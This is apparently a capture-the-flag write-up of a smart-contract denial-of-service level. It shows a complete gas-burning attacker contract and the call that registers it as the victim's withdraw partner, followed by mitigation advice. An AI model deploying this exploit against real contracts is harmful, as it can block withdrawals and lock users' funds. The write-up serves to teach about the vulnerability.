# Introduction

The Denial contract demonstrates a vulnerability that enables a **Denial of Service (DoS)** attack using unbounded gas consumption. The issue arises from improper handling of external calls using call without specifying a gas limit.

# Target
Prevent the `withdraw` function from successfully executing, blocking withdrawals indefinitely.

# Context
The Denial contract has the following key components:
* A `partner` variable (type `address`) to receive 1% of the contract's balance.
* An `owner` variable (type `address`) set to a fixed `address`.

* The `withdraw` function sends ETH to `partner` using `call` without a gas limit, making it vulnerable to gas exhaustion.

* An attacker can deploy a malicious contract with an expensive operation in the `receive` function to consume all available gas.

# Security Vulnerability

The `withdraw` function in the vulnerable contract allows a denial-of-service (DoS) attack due to improper handling of external calls using `call` without setting a gas limit. This enables a malicious contract to consume all gas and revert the transaction.

## Exploit Steps

### Deploy the Malicious `GasBurner` Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GasBurner {
    uint256 n;

    function burn() internal {
        while (gasleft() > 0) {
            n += 1;
        }
    }

    receive() external payable {
        burn();
    }
}
```

1. Deploy `GasBurner` and copy its address.
2. Call the vulnerable contract's `setWithdrawPartner` method to set `GasBurner` as the partner:

   ```javascript
   await contract.setWithdrawPartner('<gas-burner-address>')
   ```

Now, whenever `withdraw` is called, it triggers the `receive` function of `GasBurner` and consumes all gas, causing `withdraw` to fail with an "out of gas" exception.

## Improper Gas Handling

In the vulnerable contract, the `withdraw` function executes an external call without limiting gas:

```solidity
    partner.call{value: amountToSend}("");
    payable(owner).transfer(amountToSend);
```

Using `call` sends all available gas, enabling malicious contracts to perform expensive operations and exhaust the gas limit.

## Gas Consumption Attack

The `GasBurner` contract’s `burn` function runs a costly operation:

- The loop `while (gasleft() > 0)` increments a state variable, which is expensive due to storage writes.
- The loop consumes all available gas, causing the original `withdraw` call to fail.

## Mitigation Strategy

To prevent this vulnerability, always set a gas limit when making external calls:

```solidity
(bool success, ) = partner.call{value: amountToSend, gas: 2300}("");
require(success, "Transfer failed");
```

- Limiting gas to 2,300 ensures only basic operations can run, preventing expensive loops.
- Alternatively, use `transfer` or `send` instead of `call` for fixed gas limits.

## Ownership Verification

Test the fix by calling `withdraw` again. If it completes successfully, the issue is resolved.

## Summary

This vulnerability arises from improper use of `call` without gas control. Setting a gas limit prevents malicious contracts from consuming all gas and causing DoS attacks. Always use safe patterns when making external calls!

* Note!!: An external ``CALL`` can use at most 63/64 of the gas currently available at the time of the ``CALL``. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent ``call``) can be used to mitigate this particular attack.